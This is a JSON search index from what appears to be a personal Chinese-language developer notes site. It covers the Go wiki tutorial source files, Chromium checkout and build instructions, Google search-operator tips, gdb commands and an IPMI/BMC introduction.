http.HandleFunc(\"/save/\", makeHandler(saveHandler)) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki final.go"},{"location":"go/wiki/part1.go/","text":"Source file of wiki part1.go \uf0c1 // Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"fmt\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func main() { p1 := &Page{Title: \"TestPage\", Body: []byte(\"This is a sample Page.\")} p1.save() p2, _ := loadPage(\"TestPage\") fmt.Println(string(p2.Body)) }","title":"Source file of wiki part1.go"},{"location":"go/wiki/part1.go/#source-file-of-wiki-part1go","text":"// Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"fmt\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func main() { p1 := &Page{Title: \"TestPage\", Body: []byte(\"This is a sample Page.\")} p1.save() p2, _ := loadPage(\"TestPage\") fmt.Println(string(p2.Body)) }","title":"Source file of wiki part1.go"},{"location":"go/wiki/part2.go/","text":"Source file of wiki part2.go \uf0c1 // Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"fmt\" \"log\" \"net/http\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) fmt.Fprintf(w, \"<h1>%s</h1><div>%s</div>\", p.Title, p.Body) } func main() { http.HandleFunc(\"/view/\", viewHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki part2.go"},{"location":"go/wiki/part2.go/#source-file-of-wiki-part2go","text":"// Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"fmt\" \"log\" \"net/http\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) fmt.Fprintf(w, \"<h1>%s</h1><div>%s</div>\", p.Title, p.Body) } func main() { http.HandleFunc(\"/view/\", viewHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki part2.go"},{"location":"go/wiki/part3.go/","text":"Source file of wiki part3.go \uf0c1 // Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"html/template\" \"log\" \"net/http\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, _ := template.ParseFiles(tmpl + \".html\") t.Execute(w, p) } func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func main() { http.HandleFunc(\"/view/\", viewHandler) http.HandleFunc(\"/edit/\", editHandler) //http.HandleFunc(\"/save/\", saveHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki part3.go"},{"location":"go/wiki/part3.go/#source-file-of-wiki-part3go","text":"// Copyright 2010 The Go Authors. All rights reserved. // Use of this source code is governed by a BSD-style // license that can be found in the LICENSE file. //go:build ignore package main import ( \"html/template\" \"log\" \"net/http\" \"os\" ) type Page struct { Title string Body []byte } func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } func renderTemplate(w http.ResponseWriter, tmpl string, p *Page) { t, _ := template.ParseFiles(tmpl + \".html\") t.Execute(w, p) } func viewHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/view/\"):] p, _ := loadPage(title) renderTemplate(w, \"view\", p) } func editHandler(w http.ResponseWriter, r *http.Request) { title := r.URL.Path[len(\"/edit/\"):] p, err := loadPage(title) if err != nil { p = &Page{Title: title} } renderTemplate(w, \"edit\", p) } func main() { http.HandleFunc(\"/view/\", viewHandler) http.HandleFunc(\"/edit/\", editHandler) //http.HandleFunc(\"/save/\", saveHandler) log.Fatal(http.ListenAndServe(\":8080\", nil)) }","title":"Source file of wiki part3.go"},{"location":"google/chromium_build_instructions/","text":"\u4e0b\u8f7d\u7f16\u8bd1Chromium \uf0c1 depot_tools \uf0c1 Windows: https://storage.googleapis.com/chrome-infra/depot_tools.zip Linux: git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git \u73af\u5883\u53d8\u91cf \uf0c1 # windows # \u9996\u5148\u5411\u73af\u5883\u53d8\u91cfPATH\u6dfb\u52a0 `C:\\src\\depot_tools`\uff0c\u6700\u597d\u5728Python\u8def\u5f84\u4e4b\u524d $ set DEPOT_TOOLS_UPDATE=0 # \u8fd9\u544a\u8bc9depot_tools\u4f7f\u7528\u672c\u5730\u5b89\u88c5\u7684Visual Studio\u7248\u672c\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cdepot_tools\u5c06\u5c1d\u8bd5\u4f7f\u7528google\u5185\u90e8\u7248\u672c\uff09 $ set DEPOT_TOOLS_WIN_TOOLCHAIN=0 $ set vs2017_install=\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Enterprise\" $ set vs2022_install=C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional $ set vs2022_install=C:\\Program Files\\Microsoft Visual Studio\\2022\\Community # vs2015\u7684\u8bbe\u7f6e $ set GYP_MSVS_VERSION=2015 $ set GYP_MSVS_OVERRIDE_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio 14.0 # linux # depot tool path\u5fc5\u987b\u4f7f\u7528\u5168\u8def\u5f84\uff0c\u4e0d\u8981\u4f7f\u7528~/depot_tools $ export PATH=\"$PATH:/path/to/depot_tools\" $ export DEPOT_TOOLS_UPDATE=0 \u8bbe\u7f6e\u4ee3\u7406 \uf0c1 # windows $ set http_proxy=127.0.0.1:10809 $ set https_proxy=127.0.0.1:10809 # linux $ export http_proxy=127.0.0.1:10809 $ export https_proxy=127.0.0.1:10809 # Git proxy $ git config --global http.proxy \"http://127.0.0.1:10809\" $ git config --global https.proxy \"https://127.0.0.1:10809\" gclient \uf0c1 $ gclient --nohooks --no-history \u4e0d\u60f3\u8981\u5b8c\u6574\u7684\u5386\u53f2\u8bb0\u5f55 --jobs 16 if you wish to use parallelism \u53ef\u4ee5\u4fee\u6539 .gclient \u6587\u4ef6\u6765\u4e0d\u4e0b\u8f7d\u67d0\u4e9b\u4f9d\u8d56\u5e93\uff0c\u4f8b\u5982\u4ee5\u4e0b\u4e09\u4e2a\u6587\u4ef6\u5939\u662f\u7f16\u8bd1\u540e\u751f\u6210\u7684\u6587\u4ef6\uff0c\u4e0d\u4e0b\u8f7d\u4e0d\u5f71\u54cd\u7f16\u8bd1\u548c\u8c03\u8bd5\u3002 solutions = [ { \"name\": \"src\", \"url\": \"https://gitee.com/jerry-se/chromium_deps.git\", \"managed\": False, \"custom_deps\": { \"src/chrome/tools/test/reference_build/chrome_mac\": None, \"src/chrome/tools/test/reference_build/chrome_win\": None, \"src/chrome/tools/test/reference_build/chrome_linux\": None, }, \"custom_vars\": {}, }, ] target_os = [\"win\"] Git \u914d\u7f6e \uf0c1 Windows\u73af\u5883\u9700\u8981 $ git config --global user.name \"My Name\" $ git config --global user.email \"my-name@chromium.org\" $ git config --global core.autocrlf false $ git config --global core.filemode false $ git config --global branch.autosetuprebase always Get the code \uf0c1 $ mkdir chromium && cd chromium $ fetch --nohooks chromium \u5982\u679c\u4ee3\u7801\u4e0b\u8f7d\u8fc7\u7a0b\u4e2d\u56e0\u62a5\u9519\u7b49\u4e2d\u65ad\u4e86\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7ee7\u7eed: $ gclient sync --nohooks \u7b7e\u51fa\u4ee3\u7801\u540e\uff0c\u5982\u679c\u4f7f\u7528\u7684\u662fUbuntu\u7cfb\u7edf\uff0c\u8bf7\u8fd0\u884c: $ ./build/install-build-deps.sh \u6b64\u811a\u672c\u4f1a\u5b89\u88c5\u4e00\u4e9b\u6784\u5efa\u4f9d\u8d56\u9879\u3002 \u5207\u6362\u5206\u652f # Inside chromium/src/ # \u786e\u4fdd\u4f60\u80fd\u83b7\u5f97\u4f60\u8981\u7b7e\u51fa\u7684\u6240\u6709release tag\u4fe1\u606f $ git fetch --tags # FETCH_HEAD\u60f3\u8981\u7684\u5206\u652f\uff0cmy_stable_branch\u672c\u5730\u5206\u652f\u7684\u540d\u79f0 $ git checkout -b my_stable_branch FETCH_HEAD $ git checkout -b 100.0.4896.127 100.0.4896.127 # Now synchronize the dependencies to the current branch $ gclient sync --with_branch_heads --with-tags \u56de\u5230\"trunk\" # Make sure you are in 'src'. $ git checkout -f origin/main $ gclient sync $ gclient --runhooks Get the code how to get old code Working with Release Branches OmahaProxy CSV Viewer Chromium Development Calendar and Release Info \u6784\u5efa \uf0c1 $ gn gen out/Default # Build arguments go here. # See \"gn args <out_dir> --list\" for available build arguments. is_debug = false is_component_build = true enable_nacl = false target_cpu = \"x86\" blink_symbol_level = 0 v8_symbol_level = 0 symbol_level = 0 use_goma = false \u7f16\u8bd1\u4ee3\u7801\u9700\u8981\u5b89\u88c5Windows SDK\u4e2d\u7684Debugging Tools for Windows\uff0c\u5373: \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\dbghelp.dll\" Windows SDK Windows SDK \u5386\u53f2\u7248\u672c \u7f16\u8bd1 \uf0c1 $ autoninja -C out/Default chrome $ autoninja -C out/Default base $ autoninja -C out/Default base_unittests $ autoninja -C out/Default unit_tests","title":"\u4e0b\u8f7d\u7f16\u8bd1Chromium {#check_out_and_build_chromium}"},{"location":"google/chromium_build_instructions/#check_out_and_build_chromium","text":"","title":"\u4e0b\u8f7d\u7f16\u8bd1Chromium"},{"location":"google/chromium_build_instructions/#depot_tools","text":"Windows: https://storage.googleapis.com/chrome-infra/depot_tools.zip Linux: git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git","title":"depot_tools"},{"location":"google/chromium_build_instructions/#_1","text":"# windows # \u9996\u5148\u5411\u73af\u5883\u53d8\u91cfPATH\u6dfb\u52a0 `C:\\src\\depot_tools`\uff0c\u6700\u597d\u5728Python\u8def\u5f84\u4e4b\u524d $ set DEPOT_TOOLS_UPDATE=0 # \u8fd9\u544a\u8bc9depot_tools\u4f7f\u7528\u672c\u5730\u5b89\u88c5\u7684Visual Studio\u7248\u672c\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cdepot_tools\u5c06\u5c1d\u8bd5\u4f7f\u7528google\u5185\u90e8\u7248\u672c\uff09 $ set DEPOT_TOOLS_WIN_TOOLCHAIN=0 $ set vs2017_install=\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Enterprise\" $ set vs2022_install=C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional $ set vs2022_install=C:\\Program Files\\Microsoft Visual Studio\\2022\\Community # vs2015\u7684\u8bbe\u7f6e $ set GYP_MSVS_VERSION=2015 $ set GYP_MSVS_OVERRIDE_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio 14.0 # linux # depot tool path\u5fc5\u987b\u4f7f\u7528\u5168\u8def\u5f84\uff0c\u4e0d\u8981\u4f7f\u7528~/depot_tools $ export PATH=\"$PATH:/path/to/depot_tools\" $ export DEPOT_TOOLS_UPDATE=0","title":"\u73af\u5883\u53d8\u91cf"},{"location":"google/chromium_build_instructions/#_2","text":"# windows $ set http_proxy=127.0.0.1:10809 $ set https_proxy=127.0.0.1:10809 # linux $ export http_proxy=127.0.0.1:10809 $ export https_proxy=127.0.0.1:10809 # Git proxy $ git config --global http.proxy \"http://127.0.0.1:10809\" $ git config --global https.proxy \"https://127.0.0.1:10809\"","title":"\u8bbe\u7f6e\u4ee3\u7406"},{"location":"google/chromium_build_instructions/#gclient","text":"$ gclient --nohooks --no-history \u4e0d\u60f3\u8981\u5b8c\u6574\u7684\u5386\u53f2\u8bb0\u5f55 --jobs 16 if you wish to use parallelism \u53ef\u4ee5\u4fee\u6539 .gclient \u6587\u4ef6\u6765\u4e0d\u4e0b\u8f7d\u67d0\u4e9b\u4f9d\u8d56\u5e93\uff0c\u4f8b\u5982\u4ee5\u4e0b\u4e09\u4e2a\u6587\u4ef6\u5939\u662f\u7f16\u8bd1\u540e\u751f\u6210\u7684\u6587\u4ef6\uff0c\u4e0d\u4e0b\u8f7d\u4e0d\u5f71\u54cd\u7f16\u8bd1\u548c\u8c03\u8bd5\u3002 solutions = [ { \"name\": \"src\", \"url\": \"https://gitee.com/jerry-se/chromium_deps.git\", \"managed\": False, \"custom_deps\": { \"src/chrome/tools/test/reference_build/chrome_mac\": None, \"src/chrome/tools/test/reference_build/chrome_win\": None, \"src/chrome/tools/test/reference_build/chrome_linux\": None, }, \"custom_vars\": {}, }, ] target_os = [\"win\"]","title":"gclient"},{"location":"google/chromium_build_instructions/#git","text":"Windows\u73af\u5883\u9700\u8981 $ git config --global user.name \"My Name\" $ git config --global user.email \"my-name@chromium.org\" $ git config --global core.autocrlf false $ git config --global core.filemode false $ git config --global branch.autosetuprebase always","title":"Git \u914d\u7f6e"},{"location":"google/chromium_build_instructions/#get-the-code","text":"$ mkdir chromium && cd chromium $ fetch --nohooks chromium \u5982\u679c\u4ee3\u7801\u4e0b\u8f7d\u8fc7\u7a0b\u4e2d\u56e0\u62a5\u9519\u7b49\u4e2d\u65ad\u4e86\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7ee7\u7eed: $ gclient sync --nohooks \u7b7e\u51fa\u4ee3\u7801\u540e\uff0c\u5982\u679c\u4f7f\u7528\u7684\u662fUbuntu\u7cfb\u7edf\uff0c\u8bf7\u8fd0\u884c: $ ./build/install-build-deps.sh \u6b64\u811a\u672c\u4f1a\u5b89\u88c5\u4e00\u4e9b\u6784\u5efa\u4f9d\u8d56\u9879\u3002 \u5207\u6362\u5206\u652f # Inside chromium/src/ # \u786e\u4fdd\u4f60\u80fd\u83b7\u5f97\u4f60\u8981\u7b7e\u51fa\u7684\u6240\u6709release tag\u4fe1\u606f $ git fetch --tags # FETCH_HEAD\u60f3\u8981\u7684\u5206\u652f\uff0cmy_stable_branch\u672c\u5730\u5206\u652f\u7684\u540d\u79f0 $ git checkout -b my_stable_branch FETCH_HEAD $ git checkout -b 100.0.4896.127 100.0.4896.127 # Now synchronize the dependencies to the current branch $ gclient sync --with_branch_heads --with-tags \u56de\u5230\"trunk\" # Make sure you are in 'src'. $ git checkout -f origin/main $ gclient sync $ gclient --runhooks Get the code how to get old code Working with Release Branches OmahaProxy CSV Viewer Chromium Development Calendar and Release Info","title":"Get the code"},{"location":"google/chromium_build_instructions/#_3","text":"$ gn gen out/Default # Build arguments go here. # See \"gn args <out_dir> --list\" for available build arguments. is_debug = false is_component_build = true enable_nacl = false target_cpu = \"x86\" blink_symbol_level = 0 v8_symbol_level = 0 symbol_level = 0 use_goma = false \u7f16\u8bd1\u4ee3\u7801\u9700\u8981\u5b89\u88c5Windows SDK\u4e2d\u7684Debugging Tools for Windows\uff0c\u5373: \"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\dbghelp.dll\" Windows SDK Windows SDK \u5386\u53f2\u7248\u672c","title":"\u6784\u5efa"},{"location":"google/chromium_build_instructions/#_4","text":"$ autoninja -C out/Default chrome $ autoninja -C out/Default base $ autoninja -C out/Default base_unittests $ autoninja -C out/Default unit_tests","title":"\u7f16\u8bd1"},{"location":"google/google_search_tips/","text":"Google Search Tips \uf0c1 \u5168\u8bcd\u5339\u914d\uff0c\u907f\u514d\u641c\u7d22\u7684\u5173\u952e\u8bcd\u88ab\u5206\u5f00\u547d\u4e2d \u7ed9\u641c\u7d22\u7684\u5173\u952e\u8bcd\u52a0\u4e0a\u53cc\u5f15\u53f7\"\"\uff0c\u6bd4\u5982\"IPZ-931\"\uff0c\u641c\u7d22\u756a\u53f7IPZ-931 \u641c\u7d22\u7279\u5b9a\u7684\u6587\u4ef6\u683c\u5f0f \u5728\u5173\u952e\u8bcd\u540e\u9762\u8ddf\u4e0a:\u6587\u4ef6\u683c\u5f0f\uff0c\u6bd4\u5982 \u7b80\u5386:doc \u8868\u793a\u641c\u7d22\u7b80\u5386\u7684doc\u683c\u5f0f\u3002\u4f26\u6566\u9677\u843d:torrent \u641c\u7d22\u7535\u5f71\u4f26\u6566\u9677\u843d\u7684\u79cd\u5b50\u3002 \u7ad9\u5185\u641c\u7d22 \u5728\u5173\u952e\u8bcd\u540e\u8ddfsite:\u6307\u5b9a\u7f51\u7ad9\uff0c\u6bd4\u5982shared_ptr site:csdn.com \u8868\u793a\u5728csdn\u641c\u7d22\u5171\u4eab\u6307\u9488 \u5229\u7528+-\u5173\u952e\u8bcd +A\u589e\u52a0\u5173\u952e\u8bcdA -A\u5728\u641c\u7d22\u7ed3\u679c\u6392\u9664\u5e26A\u7684 \u5728\u8f93\u5165\u5173\u952e\u8bcd\u65f6\u8ddf\u4e24\u4e2a\u70b9..\u53ef\u4ee5\u6839\u636e\u63d0\u793a\u5feb\u901f\u9501\u5b9a\u641c\u7d22\u8303\u56f4 intitle:\u5173\u952e\u8bcd \u641c\u7d22\u6807\u9898\u4e2d\u5e26\u6709\u5173\u952e\u8bcd\u7684","title":"Google Search Tips"},{"location":"google/google_search_tips/#google-search-tips","text":"\u5168\u8bcd\u5339\u914d\uff0c\u907f\u514d\u641c\u7d22\u7684\u5173\u952e\u8bcd\u88ab\u5206\u5f00\u547d\u4e2d \u7ed9\u641c\u7d22\u7684\u5173\u952e\u8bcd\u52a0\u4e0a\u53cc\u5f15\u53f7\"\"\uff0c\u6bd4\u5982\"IPZ-931\"\uff0c\u641c\u7d22\u756a\u53f7IPZ-931 \u641c\u7d22\u7279\u5b9a\u7684\u6587\u4ef6\u683c\u5f0f \u5728\u5173\u952e\u8bcd\u540e\u9762\u8ddf\u4e0a:\u6587\u4ef6\u683c\u5f0f\uff0c\u6bd4\u5982 \u7b80\u5386:doc \u8868\u793a\u641c\u7d22\u7b80\u5386\u7684doc\u683c\u5f0f\u3002\u4f26\u6566\u9677\u843d:torrent \u641c\u7d22\u7535\u5f71\u4f26\u6566\u9677\u843d\u7684\u79cd\u5b50\u3002 \u7ad9\u5185\u641c\u7d22 \u5728\u5173\u952e\u8bcd\u540e\u8ddfsite:\u6307\u5b9a\u7f51\u7ad9\uff0c\u6bd4\u5982shared_ptr site:csdn.com \u8868\u793a\u5728csdn\u641c\u7d22\u5171\u4eab\u6307\u9488 \u5229\u7528+-\u5173\u952e\u8bcd +A\u589e\u52a0\u5173\u952e\u8bcdA -A\u5728\u641c\u7d22\u7ed3\u679c\u6392\u9664\u5e26A\u7684 \u5728\u8f93\u5165\u5173\u952e\u8bcd\u65f6\u8ddf\u4e24\u4e2a\u70b9..\u53ef\u4ee5\u6839\u636e\u63d0\u793a\u5feb\u901f\u9501\u5b9a\u641c\u7d22\u8303\u56f4 intitle:\u5173\u952e\u8bcd \u641c\u7d22\u6807\u9898\u4e2d\u5e26\u6709\u5173\u952e\u8bcd\u7684","title":"Google Search Tips"},{"location":"linux_development/gdb/","text":"gdb\u8c03\u8bd5 \uf0c1 info thread\u3001next\u3001step\u3001util\u3001finish \u548c return \u547d\u4ee4 \u9644\u52a0\u5230\u8fdb\u7a0b \uf0c1 attach PID detach \u67e5\u770b\u7ebf\u7a0b\u6982\u8981\u4fe1\u606f \uf0c1 info threads \u6253\u5370\u7ebf\u7a0b\u8be6\u7ec6\u4fe1\u606f \uf0c1 thread apply all bt \u6253\u5370\u5bf9\u5e94\u9501\u7684\u4fe1\u606f \uf0c1 p mutex1 print \u53d8\u91cf \u9000\u51fa \uf0c1 q","title":"gdb\u8c03\u8bd5"},{"location":"linux_development/gdb/#gdb","text":"info thread\u3001next\u3001step\u3001util\u3001finish \u548c return \u547d\u4ee4","title":"gdb\u8c03\u8bd5"},{"location":"linux_development/gdb/#_1","text":"attach PID detach","title":"\u9644\u52a0\u5230\u8fdb\u7a0b"},{"location":"linux_development/gdb/#_2","text":"info threads","title":"\u67e5\u770b\u7ebf\u7a0b\u6982\u8981\u4fe1\u606f"},{"location":"linux_development/gdb/#_3","text":"thread apply all bt","title":"\u6253\u5370\u7ebf\u7a0b\u8be6\u7ec6\u4fe1\u606f"},{"location":"linux_development/gdb/#_4","text":"p mutex1 print \u53d8\u91cf","title":"\u6253\u5370\u5bf9\u5e94\u9501\u7684\u4fe1\u606f"},{"location":"linux_development/gdb/#_5","text":"q","title":"\u9000\u51fa"},{"location":"linux_development/ipmi/","text":"IPMI \uf0c1 \u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u3002 \u5e73\u53f0\u7ba1\u7406 \uf0c1 \u5e73\u53f0\u7ba1\u7406(Platform Management)\u8868\u793a\u7684\u662f\u4e00\u7cfb\u5217\u7684\u76d1\u89c6\u548c\u63a7\u5236\u529f\u80fd\uff0c\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u7cfb\u7edf\u786c\u4ef6\u3002\u6bd4\u5982\uff1a\u901a\u8fc7\u76d1\u89c6\u7cfb\u7edf\u7684\u6e29\u5ea6\uff0c\u7535\u538b\uff0c\u98ce\u6247\u3001\u7535\u6e90\u7b49\u7b49\uff0c\u5e76\u505a\u76f8\u5e94\u7684\u8c03\u8282\u5de5\u4f5c\uff0c\u4ee5\u4fdd\u8bc1\u7cfb\u7edf\u5904\u4e8e\u5065\u5eb7\u7684\u72b6\u6001\u3002\u5982\u679c\u7cfb\u7edf\u771f\u7684\u4e0d\u6b63\u5e38\u4e86\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u590d\u4f4d\u7684\u65b9\u5f0f\u6765\u91cd\u65b0\u542f\u52a8\u7cfb\u7edf\u3002\u540c\u65f6\u5e73\u53f0\u7ba1\u7406\u8fd8\u8d1f\u8d23\u8bb0\u5f55\u5404\u79cd\u786c\u4ef6\u7684\u4fe1\u606f\u548c\u65e5\u5fd7\u8bb0\u5f55\uff0c\u7528\u4e8e\u63d0\u793a\u7528\u6237\u548c\u540e\u7eed\u95ee\u9898\u7684\u5b9a\u4f4d\u3002 \u4ee5\u4e0a\u7684\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u96c6\u6210\u5230\u4e00\u4e2a\u63a7\u5236\u5668\u4e0a\u6765\u5b9e\u73b0\uff0c\u8fd9\u4e2a\u63a7\u5236\u5668\u88ab\u79f0\u4e3a BMC \uff08Baseboard Manager Controller\uff0c\u57fa\u677f\u7ba1\u7406\u63a7\u5236\u5668\uff09\u3002 BMC \uf0c1 BMC \u901a\u5e38\u662f\u4e00\u4e2a\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e3b\u677f\u4e0a\u7684\u72ec\u7acb\u677f\u5361\uff0c\u5176\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7684\u5904\u7406\u5668\u3001BIOS \u6216\u64cd\u4f5c\u7cfb\u7edf\u6765\u5de5\u4f5c\uff0c\u53ef\u8c13\u975e\u5e38\u5730\u72ec\u7acb\uff0c\u662f\u4e00\u4e2a\u5355\u72ec\u5728\u7cfb\u7edf\u5185\u8fd0\u884c\u7684\u65e0\u4ee3\u7406\u7ba1\u7406\u5b50\u7cfb\u7edf\u3002\u901a\u4fd7\u6765\u8bb2\uff0c BMC \u662f\u6574\u4e2a\u670d\u52a1\u5668\u5355\u677f\u7684\u5927\u7ba1\u5bb6\u3002 BMC \u4e0e\u4e3b\u677f\u4e0a\u7684\u4e0d\u540c\u4f20\u611f\u5668\u901a\u4fe1\u6765\u76d1\u89c6\u7cfb\u7edf\u662f\u5426\u6709\u4e25\u91cd\u4e8b\u4ef6\uff0c\u5e76\u5728\u67d0\u4e9b\u53c2\u6570\u8d85\u51fa\u5176\u9884\u7f6e\u9608\u503c\u65f6\u53d1\u51fa\u8b66\u62a5\u548c\u65e5\u5fd7\u4e8b\u4ef6\u3002\u6240\u6709\u7684 IPMI \u529f\u80fd\u90fd\u662f\u5411 BMC \u53d1\u9001\u547d\u4ee4\uff08IPMI \u89c4\u8303\u4e2d\u89c4\u5b9a\u7684\u6307\u4ee4\uff09\u6765\u5b8c\u6210\u7684\uff0c BMC \u63a5\u6536\u5e76\u5728\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u4e8b\u4ef6\u6d88\u606f\uff0c\u7ef4\u62a4\u63cf\u8ff0\u7cfb\u7edf\u4e2d\u4f20\u611f\u5668\u60c5\u51b5\u7684\u4f20\u611f\u5668\u6570\u636e\u8bb0\u5f55\u3002 BMC \u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a \u901a\u8fc7\u7cfb\u7edf\u7684\u4e32\u884c\u7aef\u53e3\u8fdb\u884c\u8bbf\u95ee \u6545\u969c\u65e5\u5fd7\u8bb0\u5f55\u548c SNMP \u8b66\u62a5\u53d1\u9001 \u8bbf\u95ee\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u548c\u4f20\u611f\u5668\u72b6\u51b5 \u8fdc\u7a0b\u5f00\u3001\u5173\u673a \u72ec\u7acb\u4e8e\u7cfb\u7edf\u7535\u6e90\u6216\u5de5\u4f5c\u72b6\u6001\u7684\u652f\u6301 \u7528\u4e8e\u7cfb\u7edf\u8bbe\u7f6e\u3001\u57fa\u4e8e\u6587\u672c\u516c\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u63a7\u5236\u53f0\u7684\u6587\u672c\u63a7\u5236\u53f0\u91cd\u5b9a\u5411 \u4e00\u822c\u6211\u4eec\u7684\u7535\u8111\u4e0d\u4f1a\u81ea\u5e26 BMC \uff0c\u56e0\u4e3a\u7528\u5904\u4e0d\u5927\uff0c\u4e00\u4e9b\u6e29\u5ea6\u3001\u7535\u6e90\u7b49\u7684\u7ba1\u7406\uff0c\u901a\u8fc7 CPU \u6765\u63a7\u5236\u5c31\u591f\u4e86\u3002\u4f46\u662f\u5bf9\u4e8e\u7cfb\u7edf\u8981\u6c42\u9ad8\u7684\u8bbe\u5907\uff0c\u6bd4\u5982\u670d\u52a1\u5668\uff0c\u5c31\u4f1a\u7528\u5230 BMC \u3002\u53c8\u56e0\u4e3a BMC \u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u7cfb\u7edf\uff0c\u5bf9\u4e8e\u67d0\u4e9b\u5d4c\u5165\u5f0f\u8bbe\u5907\uff0c\u53ef\u80fd\u4e0d\u9700\u8981\u5176\u5b83\u5904\u7406\u5668\uff0c\u5149\u4e00\u4e2a BMC \u5c31\u80fd\u5b8c\u6210\u5de5\u4f5c\u3002 \u53ef\u89c1\uff0c BMC \u672c\u8d28\u5c31\u662f\u4e00\u4e2a\u5e26\u5904\u7406\u5668\uff08\u4e00\u822c\u90fd\u662f ARM \u5904\u7406\u5668\uff09\u7684\u5c0f\u7cfb\u7edf\uff0c\u5355\u72ec\u7528\u6765\u5904\u7406\u67d0\u4e9b\u5de5\u4f5c\u4e5f\u5b8c\u5168\u662f\u53ef\u4ee5\u7684\u3002 IPMI \uf0c1 IPMI \uff08Intelligent Platform Management Interface\uff0c\u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\uff09\u662f\u4e00\u9879\u5e94\u7528\u4e8e\u670d\u52a1\u5668\u5e26\u5916\u7ba1\u7406\u7cfb\u7edf\u8bbe\u8ba1\u7684\u6807\u51c6\uff0c\u901a\u8fc7\u7279\u6709\u7684\u786c\u4ef6\u8bbe\u5907\u800c\u4e0d\u662f\u64cd\u4f5c\u7cfb\u7edf\u7f51\u7edc\u8fde\u63a5\u6765\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u7535\u6e90\u7684\u624b\u6bb5\u3002 IPMI 